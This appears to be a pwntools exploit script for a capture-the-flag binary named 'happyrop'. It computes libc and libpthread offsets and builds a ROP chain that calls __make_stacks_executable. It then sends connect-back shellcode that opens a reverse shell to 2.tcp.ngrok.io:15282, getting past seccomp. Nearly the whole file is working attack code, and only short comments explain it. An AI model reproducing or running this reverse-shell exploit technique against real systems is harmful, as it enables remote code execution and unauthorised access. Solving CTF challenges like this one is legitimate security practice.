from pwn import *

#init

e = ELF('./happyrop')
libp = ELF('./libpthread-2.31.so')
libc = ELF('./libcs-2.31.so')
ld = ELF('./ld-2.31.so')

context.binary = e

p = process(e.path)
#p = remote()

#funcs

def add(x, y, t = True):
    if t:
        p.sendlineafter('(y/N)', 'y')
    p.sendlineafter('to:', str(x))
    p.sendlineafter('add:', str(y))

#vars

libp_off = 0x3a230
strtthread_off = libp.sym['start_thread']
stkexec_off = libp.sym['__make_stacks_executable']

libc_off = 0x5d230
strt_off = libc.sym['__libc_start_main']
nlglolo_off = libc.sym['_nl_global_locale']
nlupper_off = libc.sym['_nl_C_LC_CTYPE_toupper']
pthreadexit_off = libc.sym['pthread_exit']

shellcode = shellcraft.connect('2.tcp.ngrok.io', 15282)
shellcode += shellcraft.dupsh()
shellcode += shellcraft.exit(0)

log.info('Libp off: ' + hex(libp_off))
log.info('Start thread libp off: ' + hex(strtthread_off))
log.info('Stack exec libp off: ' + hex(stkexec_off))
print("")
log.info("Libc off: " + hex(libc_off))
log.info('Start libc off: ' + hex(strt_off))
log.info('Nlglolo libc off: ' + hex(nlglolo_off))
log.info('Nlupper libc off: ' + hex(nlupper_off))
log.info('Pthreadexit libc off: ' + hex(pthreadexit_off))
print("")
log.info('Shellcode len: ' + hex(len(asm(shellcode))))

#exploit

#thread stack is at fixed offset to libc, change return address to thread stack

add(19, 0x10 * 8 - (libc_off + strt_off + 243), False)

#create rop feng shui chain to call __make_stacks_executable then return pthread_exit

rop = ROP(libc)

add(37, (libc_off + rop.rdi.address) - (libp_off + strtthread_off + 217))
add(39, 0x5c900 + rop.rsp.address)
add(40, -0x90)
add(280, pthreadexit_off - (nlupper_off + 512))
add(276, (libp_off + stkexec_off + 32) - (libc_off + nlglolo_off)) #idk why this one has to be last

#add shell code while also calling rop chain which eventually runs shellcode without seccomp
#use this to connect to shell with ngrok

p.sendlineafter('(y/N)', asm(shellcode))

#pray for flag

p.interactive()
